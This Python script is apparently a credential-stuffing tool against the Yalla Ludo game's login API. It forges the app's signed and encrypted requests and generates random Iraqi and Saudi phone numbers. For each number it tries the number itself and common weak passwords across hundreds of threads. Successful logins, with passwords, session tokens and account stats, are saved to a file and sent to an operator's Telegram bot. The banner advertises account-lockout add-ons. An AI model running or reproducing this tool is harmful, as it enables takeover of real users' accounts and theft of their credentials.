# -*- coding: utf-8 -*-
import base64
import json
import hashlib
import requests
import random
import threading
import time
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import uuid
import struct
import hmac as hmacmod
import string
from queue import Queue
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    class Dummy:
        pass
    Fore = Back = Style = Dummy()
    Fore.GREEN = Fore.RED = Fore.YELLOW = Fore.CYAN = Fore.MAGENTA = ''
    Back.GREEN = Back.RED = Back.YELLOW = Back.WHITE = Back.BLACK = ''
    Style.BRIGHT = ''

try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say

BLUE = "\033[1;34m"
PINK = "\033[1;35m"
RED = "\033[1;31m"
GREEN = "\033[1;32m"
BOLD = "\033[1m"
RESET = "\033[0m"

class Colors:
    BLUE = '\033[1;34m'
    PINK = '\033[1;35m'
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    CYAN = '\033[1;36m'
    YELLOW = '\033[1;33m'
    
    @staticmethod
    def gradient(text):
        colors = ['\033[1;31m', '\033[1;35m', '\033[1;34m', '\033[1;32m']
        return ''.join(f'{colors[i % len(colors)]}{c}' for i, c in enumerate(text)) + Colors.RESET

XOR_KEY = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")

def xor_encrypt(data):
    return bytes(value ^ XOR_KEY[index % len(XOR_KEY)] for index, value in enumerate(data))

def xor_decrypt(data):
    return bytes(value ^ XOR_KEY[index % len(XOR_KEY)] for index, value in enumerate(data))

def build_payload(payload_dict):
    json_bytes = json.dumps(payload_dict, separators=(",", ":")).encode("utf-8")
    encrypted = xor_encrypt(json_bytes)
    return {"paramJsonString": base64.b64encode(encrypted).decode("utf-8")}

def decode_param(param_b64):
    decoded = base64.b64decode(param_b64)
    decrypted = xor_decrypt(decoded)
    return json.loads(decrypted.decode("utf-8"))

def get_md5(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

version = "3.0"

# ============= ENCRYPTION FUNCTIONS (Dynamic Headers) =============
b1key = b'4e82797b276c5cb729db62aaa229a057'
b1iv = b'0102030405060708'
secret = 'L3)qk*@8'
ua = "YallaLudo-1.5.0.0-(Build 1050003)-Android 32"
kvals = [int(abs(__import__('math').sin(i+1)) * 2**32) & 0xffffffff for i in range(64)]
shift = [7,12,17,22]*4 + [5,9,14,20]*4 + [4,11,16,23]*4 + [6,10,15,21]*4
ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)

def md5raw(msg, iv):
    a0, b0, c0, d0 = iv
    length = len(msg) * 8
    m = msg + b'\x80'
    while len(m) % 64 != 56:
        m += b'\x00'
    m += struct.pack('<Q', length)
    for ch in range(0, len(m), 64):
        block = struct.unpack('<16I', m[ch:ch+64])
        a, b, c, d = a0, b0, c0, d0
        for i in range(64):
            if i < 16:
                f = (b & c) | (~b & d)
                g = i
            elif i < 32:
                f = (d & b) | (~d & c)
                g = (5*i+1) % 16
            elif i < 48:
                f = b ^ c ^ d
                g = (3*i+5) % 16
            else:
                f = c ^ (b | ~d)
                g = (7*i) % 16
            f = (f + a + kvals[i] + block[g]) & 0xffffffff
            a = d
            d = c
            c = b
            b = (b + ((f << shift[i]) | (f >> (32-shift[i])))) & 0xffffffff
        a0 = (a0 + a) & 0xffffffff
        b0 = (b0 + b) & 0xffffffff
        c0 = (c0 + c) & 0xffffffff
        d0 = (d0 + d) & 0xffffffff
    return struct.pack('<4I', a0, b0, c0, d0)

def md5r(msg):
    return md5raw(msg.encode() if isinstance(msg, str) else msg, ivrev).hex()

def md5s(msg):
    if isinstance(msg, str):
        msg = msg.encode()
    return hashlib.md5(msg).hexdigest()

def encrypt_data(data, hera):
    k = md5r(hera + secret).encode()
    ks = (k * (len(data) // len(k) + 1))[:len(data)]
    return base64.b64encode(bytes(a ^ b for a, b in zip(data, ks))).decode()

def sign(data, hera):
    key = md5r(hera + secret).encode()
    return hmacmod.new(key, data, hashlib.sha256).hexdigest()

def medusa(data, hera):
    pt = f'{md5s(data)}-{len(data)}-{md5r(hera + secret)}-{secret}'
    ct = AES.new(b1key, AES.MODE_CBC, b1iv).encrypt(pad(pt.encode(), 16))
    return base64.b64encode(ct).decode()

def gendevice():
    device = str(uuid.uuid4())
    android = f'{uuid.uuid4().hex}_{uuid.uuid4().hex[:16]}'
    chars = string.ascii_letters + string.digits
    shumeng = ''.join(random.choice(chars) for _ in range(36))
    nonce = f'{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}'
    return device, android, shumeng, nonce

def baggage(timestamp, device, shumeng, nonce, android):
    obj = {
        "timeSpan": timestamp,
        "version": "1.5.1.0",
        "deviceId": device,
        "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2,
        "downloadChannelId": 1,
        "shuMengId": shumeng,
        "nonce": nonce,
        "plateType": 0,
        "LanguageId": 2,
        "phoneModel": "SM-S918B",
        "X-Phone-Country": "SA",
        "X-Sim-Country": "SA",
        "AndroidId": android,
        "appType": 0,
    }
    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()

def buildrequest(body, device, shumeng, nonce, android):
    now = str(int(time.time() * 1000))
    hera = uuid.uuid4().hex
    bag = baggage(now, device, shumeng, nonce, android)

    endpoint = "/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
    signed = (endpoint + ua + bag).encode('utf-8')

    xsign = f'{version}_2_{sign(signed, hera)}'
    xmedusa = medusa(signed, hera)

    encrypted_body = encrypt_data(body, hera)
    wire = json.dumps({"paramJsonString": encrypted_body}, separators=(',',':')).encode('utf-8')

    headers = {
        'User-Agent': ua,
        'UserId': '0',
        'X-App-Id': 'ludo',
        'X-Baggage': bag,
        'X-Access-Token': '',
        'X-Timestamp': now,
        'versionString': '1.5.1.0',
        'X-Sign': xsign,
        'X-Hera': hera,
        'X-Time': now,
        'X-Medusa': xmedusa,
        'Content-Type': 'application/json; charset=utf-8',
    }
    return headers, wire

# ============= LOGO =============
Logo = f"""
\033[1;31m●─────━PS ──━●
\033[1;31m╱╱╭━━━┳━┳━━━┳━╮
\033[1;35m╭━┫╭━╮┃━┫╭━╮┃━┫
\033[1;31m┃╋┣╯╭╯┣━┣╯╭╯┣━┃
\033[1;35m┃╭╯╱┃╭┻━╯╱┃╭┻━╯
\033[1;31m╰╯╱╱┃┃╱╱╱╱┃┃

\033[1;35m  ×─> \033[1;35m━━━━━━━\033[1;31m━━━━━━━━━━\033[1;35m━━━━━━━━━━━━\033[1;35m━━━━━\033[1;31m━━━━━━\033[1;35m━━━━━ <─×\033[0m"""

def display_logo():
    clear_screen()
    print(Logo)
    print(f"""\033[1;35m  ×─> \033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ <─×
\033[1;35m  ×─> \033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ <─×
\033[1;35m  ×─> \033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ <─×
\033[1;35m  DEVELOPER \033[1;31m│\033[1;35m  PS -
\033[1;35m  STATUS    \033[1;31m│\033[1;35m  Premium
\033[1;35m  VERSION   \033[1;31m│\033[1;35m  V\033[1;31m/\033[1;35m{version}
\033[1;35m  ×─> \033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ <─×
\033[1;31m 𝐷𝐸𝑉 𝑃𝑆 | @p7s7s + @ali313eme8
\033[1;35m  ×─> \033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ <─×
\033[1;35m  ×─> FUTURES  \033[1;31m│\033[1;35m  FILE\033[1;31m〤\033[1;35mCLONE
\033[1;35m  ×─> DEV \033[1;31m│\033[1;35m  PS ~ @p7s7s
\033[1;35m  ×─>trust    \033[1;31m│\033[1;35m  @ali313eme8
\033[1;35m  ×─> \033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ <─×\033[0m""")

# ============= GLOBALS =============
hits_list = []
results = []
stats = defaultdict(int)
lock = threading.Lock()
stop_flag = False
MAX_RESULTS = 2000
valid_accounts_file = "A_valid_accounts.txt"
thread_local = threading.local()
PASSWORDS = []

# Queue for Telegram messages (to ensure delivery)
telegram_queue = Queue()
telegram_worker_started = False

def telegram_worker():
    """Worker thread that sends messages from the queue with retries."""
    global telegram_worker_started
    telegram_worker_started = True
    while True:
        try:
            item = telegram_queue.get(timeout=1)
        except:
            if stop_flag and telegram_queue.empty():
                break
            continue
        if item is None:
            break
        phone, pwd, user_info, login_data = item
        send_telegram_with_retry(phone, pwd, user_info, login_data)
        telegram_queue.task_done()

def send_telegram_with_retry(phone, pwd, user_info, login_data, max_retries=3):
    """Send telegram message with retries and better error handling."""
    if not BOT_TOKEN or not CHAT_ID:
        return

    show_num_id = login_data.get("showNumId", "N/A")
    name = login_data.get("name", "N/A") if login_data else "N/A"

    text = f"""「 ✦ YALLA LUDO ✦ 」

▬▬▬▬▬▬▬▬▬▬▬▬▬

  ❖ ID       ➜ `{show_num_id}`
  ❖ Name     ➜ {name}
  ❖ Phone    ➜ `{phone}`
  ❖ Pass     ➜ `{pwd}`
  ❖ Channel  ➜ @ali313eme
  ❖ Dev      ➜ @p7s7s
▬▬▬▬▬▬▬▬▬▬▬▬▬

ملاحضه مهمه:  هاذي الادات تجربه علا دولتين فقط 
 • هاي الاداه  وعلا 22 دوله عربيه 
هناء: https://t.me/ali313eme/4192?single
انطيك وياها نسخه قفل الحساب وتسجيل خروج جميع الاجهزه 
 وشرح تغيير ربط الاحساب  
والاداه تجيك دائميه مع تحديثات  """

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown",
        "disable_web_page_preview": True
    }

    for attempt in range(max_retries):
        try:
            resp = requests.post(url, json=payload, timeout=10)
            if resp.status_code == 200:
                return True
            else:
                # If failed, wait before retry
                time.sleep(1 + attempt * 2)
        except Exception as e:
            time.sleep(1 + attempt * 2)
    # If all retries failed, log or ignore
    return False

def queue_telegram(phone, pwd, user_info, login_data):
    """Add telegram message to queue for asynchronous sending."""
    global telegram_worker_started
    if not telegram_worker_started:
        # Start worker thread on first use
        t = threading.Thread(target=telegram_worker, daemon=True)
        t.start()
    telegram_queue.put((phone, pwd, user_info, login_data))

def print_dashboard(stats, selected_country):
    clear_screen()
    display_logo()
    print(f"\n{'─' * 55}")
    print(f"│ {Colors.RED}● COUNTRY{Colors.RESET}          {selected_country['name']}  {Colors.RESET}│")
    print(f"│ {Colors.GREEN}● HIT{Colors.RESET}        {stats['good']}  {Colors.RED}● WRONG{Colors.RESET}        {stats['wrong_pass']}  {Colors.PINK}● NOTREG{Colors.RESET}      {stats['not_registered']}  │")
    print(f"{'─' * 55}")

    if hits_list:
        print(f"\n{Colors.GREEN}═══ HIT ACCOUNTS ═══{Colors.RESET}")
        for hit in hits_list:
            print(f"{Colors.GREEN}[HIT]{Colors.RESET} {Colors.PINK}{hit['phone']}{Colors.RESET} {Colors.BLUE}|{Colors.RESET} {Colors.YELLOW}{hit['pass']}{Colors.RESET} {Colors.BLUE}|{Colors.RESET} {Colors.RED}ID: {hit.get('id', 'N/A')}{Colors.RESET}")
        print()

    print(f"{Colors.CYAN}▶ SCANNING...{Colors.RESET}")
    sys.stdout.flush()

DOMAINS = [
    "httpgateway.carrstuv.com",
    "httpgateway.foodjkl.com",
    "httpgateway.planecde.com",
]

BASE_URL = "https://{domain}/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
USER_INFO_URL = "https://{domain}/api/LudoUserRpcApiProxy/GetUserInfo"

countries_data = {
    "1": {"name": "Iraq", "code": "964", "countryCode": "IQ", "prefixes": ["0750", "0751", "0770", "0771", "0780", "0781", "0790", "0791"]},
    "2": {"name": "Saudi Arabia", "code": "966", "countryCode": "SA", "prefixes": ["050", "053", "054", "055", "056", "057", "058", "059"]},
}

PAYLOAD = {
    "mobile": "",
    "areaCode": "966",
    "password": "",
    "languageId": 2,
    "nationalityId": "1",
    "hostConfig": [
        {"bizType": 5000, "countryCode": "IQ", "hostUrl": "https://api-shumeng.yalla.games", "type": 2, "version": 4},
        {"bizType": 5001, "countryCode": "", "hostUrl": "ws://firebreak.yalla.games", "type": 1, "version": 1},
        {"bizType": 5002, "countryCode": "IQ", "hostUrl": "https://jwt.sailfishx.live", "type": 1000, "version": 0},
        {"bizType": 5003, "countryCode": "IQ", "hostUrl": "https://jwt.sailfishx.live", "type": 1000, "version": 0},
        {"bizType": 5004, "countryCode": "IQ", "hostUrl": "https://httpgateway.penabcd.com", "type": 2, "version": 6},
        {"bizType": 5005, "countryCode": "IQ", "hostUrl": "https://api.lightkvd.com", "type": 2, "version": 4},
        {"bizType": 5006, "countryCode": "IQ", "hostUrl": "https://upload-as0.qiniup.com", "type": 2, "version": 5},
        {"bizType": 5007, "countryCode": "", "hostUrl": "https://www.yallapay.live,https://www.payfun.live,https://pre-www.yallapay.live,https://activity.funcdeg.com,https://activity.carrstuv.com", "type": 1, "version": 11},
        {"bizType": 2001, "countryCode": "", "hostUrl": "https://roomapi.yalla.games,https://roomapi.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2002, "countryCode": "", "hostUrl": "https://roomclog.yalla.games,https://roomclog.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2003, "countryCode": "", "hostUrl": "https://roommoment.yalla.games,https://roommoment.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2004, "countryCode": "", "hostUrl": "https://www.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2005, "countryCode": "", "hostUrl": "https://file.yalla.Live", "type": 1, "version": 0},
        {"bizType": 2006, "countryCode": "IQ", "hostUrl": "https://nitrogen.foodjkl.com,https://nitrogen.yalla.games,https://nitrogen.carrstuv.com", "type": 2, "version": 19},
        {"bizType": 2007, "countryCode": "IQ", "hostUrl": "wss://room.foodjkl.com,wss://room.yalla.games,wss://room.carrstuv.com", "type": 2, "version": 22},
        {"bizType": 2008, "countryCode": "IQ", "hostUrl": "wss://roomgame.yalla.games,wss://roomgame.foodjkl.com,wss://roomgame.carrstuv.com", "type": 2, "version": 18},
        {"bizType": 4000, "countryCode": "IQ", "hostUrl": "ws://ludo01.carrstuv.com,wss://new-ludo.carrstuv.com", "type": 2, "version": 84},
        {"bizType": 4001, "countryCode": "IQ", "hostUrl": "ws://domino01.carrstuv.com,wss://new-domino.carrstuv.com", "type": 2, "version": 83},
        {"bizType": 4003, "countryCode": "IQ", "hostUrl": "wss://duelludo.carrstuv.com", "type": 2, "version": 20},
        {"bizType": 4004, "countryCode": "IQ", "hostUrl": "wss://jungleludo.carrstuv.com", "type": 2, "version": 20},
        {"bizType": 1000, "countryCode": "IQ", "hostUrl": "https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com", "type": 2, "version": 19},
        {"bizType": 1001, "countryCode": "IQ", "hostUrl": "https://pay.foodjkl.com,https://pay.yalla.games,https://pay.carrstuv.com", "type": 2, "version": 17},
        {"bizType": 1002, "countryCode": "IQ", "hostUrl": "https://mail.foodjkl.com,https://mail.yalla.games,https://mail.carrstuv.com", "type": 2, "version": 18},
        {"bizType": 1003, "countryCode": "IQ", "hostUrl": "https://clog.foodjkl.com,https://clog.carrstuv.com,https://clog.yalla.games", "type": 2, "version": 17},
        {"bizType": 1004, "countryCode": "IQ", "hostUrl": "https://activity.carrstuv.com,https://activity.yalla.games,https://activity.foodjkl.com", "type": 2, "version": 17},
        {"bizType": 1005, "countryCode": "IQ", "hostUrl": "https://usuallyactivity.carrstuv.com,https://usuallyactivity.yalla.games,https://usuallyactivity.foodjkl.com", "type": 2, "version": 17},
        {"bizType": 1006, "countryCode": "IQ", "hostUrl": "https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com", "type": 2, "version": 20},
        {"bizType": 1007, "countryCode": "IQ", "hostUrl": "wss://tyr.foodjkl.com,wss://tyr.carrstuv.com,wss://tyr.yalla.games", "type": 2, "version": 18},
        {"bizType": 1008, "countryCode": "IQ", "hostUrl": "wss://hall.carrstuv.com,wss://hall.foodjkl.com,wss://hall.yallaludo.com", "type": 2, "version": 38},
        {"bizType": 6000, "countryCode": "", "hostUrl": "https://broadcast-host.ylconfig.com", "type": 1, "version": 0},
        {"bizType": 3000, "countryCode": "IQ", "hostUrl": "https://file.carrstuv.com", "type": 2, "version": 27},
        {"bizType": 3001, "countryCode": "IQ", "hostUrl": "https://dtchat.yalla.games,https://dtchat.carrstuv.com,https://dtchat.foodjkl.com", "type": 2, "version": 18},
        {"bizType": 3002, "countryCode": "IQ", "hostUrl": "https://activity.foodjkl.com,https://activity.carrstuv.com,https://activity.yalla.games", "type": 2, "version": 17},
        {"bizType": 3003, "countryCode": "IQ", "hostUrl": "https://dtslave.foodjkl.com,https://dtslave.yalla.games,https://dtslave.carrstuv.com", "type": 2, "version": 18},
        {"bizType": 3004, "countryCode": "IQ", "hostUrl": "wss://dtslave.yalla.games,wss://dtslave.carrstuv.com,wss://dtslave.foodjkl.com", "type": 2, "version": 17}
    ],
    "simCountry": "SA",
    "version": "1.5.1.0",
    "deviceId": "f8a37276-bfc9-4379-a0e7-638a4dd6dd15",
    "deviceName": "realme RMX3085",
    "deviceType": 2,
    "downloadChannelId": 1,
    "shuMengId": "DUZo2o2od9mmkAoUBfsElGX4fDoiW6Xnt3gd",
    "nonce": "-567746773_8d4bca46-10c1-4ece-b94b-b11b848318c7",
    "plateType": 0,
    "phoneModel": "RMX3085",
    "X-Phone-Country": "SA",
    "X-Sim-Country": "SA",
    "AndroidId": "ff6c831833c83558a4e7eac17207bd59_e38db79eb11f7352",
    "IsSubpackages": 0,
    "appType": 0,
}

DEFAULT_PASSWORDS = [
    'Aa123456',
    'As123456',
    'Aa123123',
    'Aa1234567890',
    'Aa112233',
    'Aa1234567',
    'Aa12345678',
    'Aa123456789',     
]
RAQ_PASSWORDS = [
    'Aa123456',
    'Aa123123',
    'Aa112233',
    'qwer1234',
    'zxcv1234',
    '1234qwer',
    '1q2w3e4r',
    'qwer1111',
    'qwer0000'
]

BOT_TOKEN = input(f"{Colors.RED}[?]{Colors.RESET} {Colors.PINK}Bot Token:{Colors.RESET} ").strip()
CHAT_ID = input(f"{Colors.RED}[?]{Colors.RESET} {Colors.PINK}Chat ID:{Colors.RESET} ").strip()

def get_session():
    if not hasattr(thread_local, "session"):
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=500, pool_maxsize=500, max_retries=0)
        session.mount('https://', adapter)
        thread_local.session = session
    return thread_local.session

def get_user_info(token, user_id, domain):
    timestamp = str(int(time.time() * 1000))
    headers = {
        'User-Agent': ua,
        'x-timestamp': timestamp,
        'x-time': timestamp,
        'x-access-token': token,
        'Content-Type': 'application/json',
    }

    payload = {"userId": int(user_id)}

    try:
        resp = requests.post(USER_INFO_URL.format(domain=domain), json=payload, headers=headers, timeout=5)
        if resp.status_code == 200:
            resp_data = resp.json()
            if "paramJsonString" in resp_data and isinstance(resp_data["paramJsonString"], str):
                try:
                    data = decode_param(resp_data["paramJsonString"])
                except Exception:
                    data = resp_data
            else:
                data = resp_data

            if data.get("status") == 0:
                return data.get("data", {})
    except:
        pass
    return None

def save_valid_account(phone, pwd, user_info, login_data):
    try:
        show_num_id = login_data.get("showNumId", "N/A")
        name = login_data.get("name", "N/A")
        level = user_info.get("level", "N/A") if user_info else "N/A"
        coin = user_info.get("coin", "N/A") if user_info else "N/A"
        diamond = user_info.get("diamond", "N/A") if user_info else "N/A"
        exp = user_info.get("exp", "N/A") if user_info else "N/A"
        vip = user_info.get("vip", "N/A") if user_info else "N/A"
        win = user_info.get("winCount", "N/A") if user_info else "N/A"
        lose = user_info.get("loseCount", "N/A") if user_info else "N/A"
        token = login_data.get("token", "N/A")
        uid = login_data.get("id", "N/A")

        with open(valid_accounts_file, "a", encoding="utf-8") as f:
            f.write(f"Phone: {phone}\nPass: {pwd}\n")
            f.write(f"ID: {show_num_id}\nName: {name}\nUID: {uid}\n")
            f.write(f"Level: {level}\nCoins: {coin}\nDiamond: {diamond}\n")
            f.write(f"Exp: {exp}\nVip: {vip}\nWins: {win}\nLosses: {lose}\n")
            f.write(f"Token: {token}\n")
            f.write("=" * 50 + "\n")
    except Exception:
        pass

def check_number(mobile, country_data):
    global results, stats
    if stop_flag:
        return

    device, android, shumeng, nonce = gendevice()

    payload_dict = PAYLOAD.copy()
    payload_dict["mobile"] = mobile.lstrip("0")
    payload_dict["areaCode"] = country_data["code"]
    payload_dict["simCountry"] = country_data["countryCode"]
    payload_dict["X-Phone-Country"] = country_data["countryCode"]
    payload_dict["X-Sim-Country"] = country_data["countryCode"]
    payload_dict["deviceId"] = device
    payload_dict["AndroidId"] = android
    payload_dict["shuMengId"] = shumeng
    payload_dict["nonce"] = nonce

    for config in payload_dict["hostConfig"]:
        if config.get("countryCode") != "":
            config["countryCode"] = country_data["countryCode"]

    session = get_session()

    mobile_clean = mobile.lstrip("0")
    number_password = mobile_clean
    number_twice_password = mobile_clean + mobile_clean

    test_passwords = []
    if number_password not in test_passwords:
        test_passwords.append(number_password)
    if number_twice_password not in test_passwords:
        test_passwords.append(number_twice_password)
    for pwd in PASSWORDS:
        if pwd not in test_passwords:
            test_passwords.append(pwd)

    for pwd in test_passwords:
        if stop_flag:
            return

        payload_dict["password"] = get_md5(pwd)

        data = None
        domain_used = None
        for domain in DOMAINS:
            try:
                body = json.dumps(payload_dict, separators=(',',':'), ensure_ascii=False).encode('utf-8')
                headers, wire = buildrequest(body, device, shumeng, nonce, android)

                resp = session.post(BASE_URL.format(domain=domain), data=wire, headers=headers, timeout=3)
                if resp.status_code != 200:
                    continue
                resp_data = resp.json()

                if "paramJsonString" in resp_data and isinstance(resp_data["paramJsonString"], str):
                    try:
                        hera = headers['X-Hera']
                        raw = base64.b64decode(resp_data["paramJsonString"])
                        k = md5r(hera + secret).encode()
                        ks = (k * (len(raw) // len(k) + 1))[:len(raw)]
                        dec = bytes(a ^ b for a, b in zip(raw, ks))
                        data = json.loads(dec.decode('utf-8'))
                    except Exception:
                        try:
                            data = decode_param(resp_data["paramJsonString"])
                        except:
                            data = resp_data
                else:
                    data = resp_data
                domain_used = domain
                break
            except Exception:
                continue

        if data is None:
            with lock:
                stats['error'] += 1
                stats['total'] += 1
            continue

        status = data.get("status", -1)

        if status == 0:
            acct = data.get("data", {})
            token = acct.get("token", "")
            user_id = acct.get("id", "")

            user_info = None
            if token and user_id:
                user_info = get_user_info(token, user_id, domain_used)

            with lock:
                results.append("good")
                stats['good'] += 1
                stats['total'] += 1
                hits_list.append({
                    'phone': mobile,
                    'pass': pwd,
                    'id': acct.get('showNumId', 'N/A')
                })
            # Queue telegram message instead of sending directly
            queue_telegram(mobile, pwd, user_info, acct)
            save_valid_account(mobile, pwd, user_info, acct)
            return

        elif status == 151:
            continue

        elif status == 182 or status == 1001:
            with lock:
                results.append("notreg")
                stats['not_registered'] += 1
                stats['total'] += 1
            return

        else:
            with lock:
                stats['wrong_pass'] += 1
                stats['total'] += 1
            return

    with lock:
        results.append("wrong")
        stats['wrong_pass'] += 1
        stats['total'] += 1

def generate_mobile(country_data):
    country_code = country_data["countryCode"]

    if country_code == "IQ":
        prefixes = ["077", "078"]
        return random.choice(prefixes) + ''.join([str(random.randint(0, 9)) for _ in range(8)])

    elif country_code == "SA":
        prefix = random.choice(country_data["prefixes"])
        return prefix + ''.join([str(random.randint(0, 9)) for _ in range(7)])

    else:
        prefix = random.choice(country_data["prefixes"])
        remaining_length = 10 - len(prefix)
        if remaining_length > 0:
            remaining = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
        else:
            remaining = ''
        return prefix + remaining

def show_countries():
    print(f"\n{Colors.RED}═══ Available Arab Countries ═══{Colors.RESET}\n")
    for key, country in countries_data.items():
        codes_str = " | ".join(country["prefixes"][:3]) + "..."
        print(f"{Colors.GREEN}[{key}]{Colors.RESET} {Colors.PINK}{country['name']}{Colors.RESET} {Colors.RED}➜ +{country['code']} {codes_str}{Colors.RESET}")
    print()

def get_country_choice():
    show_countries()
    while True:
        choice = input(f"{Colors.RED}[?]{Colors.RESET} {Colors.PINK}Select country (1-{len(countries_data)}):{Colors.RESET} ").strip()
        if choice in countries_data:
            return countries_data[choice]
        print(f"{Colors.RED}Invalid choice!{Colors.RESET}")

def get_password_mode(selected_country):
    if selected_country["countryCode"] == "IQ":
        return IRAQ_PASSWORDS.copy()

    print(f"\n{Colors.RED}═══ Password Mode ═══{Colors.RESET}\n")
    print(f"{Colors.GREEN}[1]{Colors.RESET} {Colors.PINK}Use Default Passwords{Colors.RESET}")
    print(f"{Colors.GREEN}[2]{Colors.RESET} {Colors.PINK}Add Custom Passwords{Colors.RESET}")

    while True:
        choice = input(f"\n{Colors.RED}[?]{Colors.RESET} {Colors.PINK}Select mode (1-2):{Colors.RESET} ").strip()
        if choice == "1":
            return DEFAULT_PASSWORDS.copy()
        elif choice == "2":
            return add_custom_passwords()
        print(f"{Colors.RED}Invalid choice!{Colors.RESET}")

def add_custom_passwords():
    passwords = []
    print(f"\n{Colors.RED}═══ Add Custom Passwords ═══{Colors.RESET}\n")

    while True:
        try:
            count = int(input(f"{Colors.RED}[?]{Colors.RESET} {Colors.PINK}How many passwords do you want to add?{Colors.RESET} ").strip())
            if count > 0:
                break
            print(f"{Colors.RED}Please enter a positive number!{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}Please enter a valid number!{Colors.RESET}")

    print(f"\n{Colors.CYAN}Enter {count} passwords one by one:{Colors.RESET}\n")
    for i in range(1, count + 1):
        pwd = input(f"{Colors.GREEN}[{i}]{Colors.RESET} {Colors.PINK}Password:{Colors.RESET} ").strip()
        if pwd:
            passwords.append(pwd)

    if passwords:
        print(f"\n{Colors.GREEN}[+] Added {len(passwords)} passwords!{Colors.RESET}")
    else:
        print(f"\n{Colors.RED}[!] No passwords added, using default passwords!{Colors.RESET}")
        passwords = DEFAULT_PASSWORDS.copy()

    return passwords

def dashboard_loop(selected_country):
    while not stop_flag:
        print_dashboard(stats, selected_country)
        time.sleep(0.5)

def main():
    global stop_flag, PASSWORDS

    print(f"\n{Colors.RED}[Country Settings]{Colors.RESET}")
    selected_country = get_country_choice()
    print(f"{Colors.GREEN}[+] Selected: {selected_country['name']} (+{selected_country['code']}){Colors.RESET}")

    PASSWORDS = get_password_mode(selected_country)

    print(f"{Colors.RED}Bot Token: {BOT_TOKEN[:20]}...{Colors.RESET}" if BOT_TOKEN else f"{Colors.RED}No Bot Token{Colors.RESET}")
    print(f"{Colors.RED}Chat ID: {CHAT_ID}{Colors.RESET}")
    print(f"{Colors.RED}Valid accounts will be saved to: {valid_accounts_file}{Colors.RESET}")
    print(f"{Colors.RED}Passwords to test: {len(PASSWORDS)}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Will test: number itself, number twice, then {len(PASSWORDS)} custom passwords{Colors.RESET}")

    if selected_country["countryCode"] == "IQ":
        THREADS = 300
    else:
        THREADS = 200

    dashboard_thread = threading.Thread(target=dashboard_loop, args=(selected_country,), daemon=True)
    dashboard_thread.start()

    # Ensure telegram worker thread is started
    global telegram_worker_started
    if not telegram_worker_started:
        t = threading.Thread(target=telegram_worker, daemon=True)
        t.start()
        telegram_worker_started = True

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        try:
            while not stop_flag:
                mobile = generate_mobile(selected_country)
                futures.append(executor.submit(check_number, mobile, selected_country))

                if len(futures) > 2000:
                    for f in as_completed(futures[:1000]):
                        pass
                    futures = futures[1000:]

        except KeyboardInterrupt:
            print("\nStopped.")
            stop_flag = True

        for f in as_completed(futures):
            pass

    # Wait for telegram queue to empty before exiting
    if not telegram_queue.empty():
        time.sleep(5)  # Give time for queued messages to be sent

    time.sleep(1)
    print(f"\n{Colors.GREEN}Done. HIT: {stats['good']}, Wrong: {stats['wrong_pass']}, NotReg: {stats['not_registered']}, Error: {stats['error']}{Colors.RESET}")
    print(f"{Colors.GREEN}Valid accounts saved to: {valid_accounts_file}{Colors.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")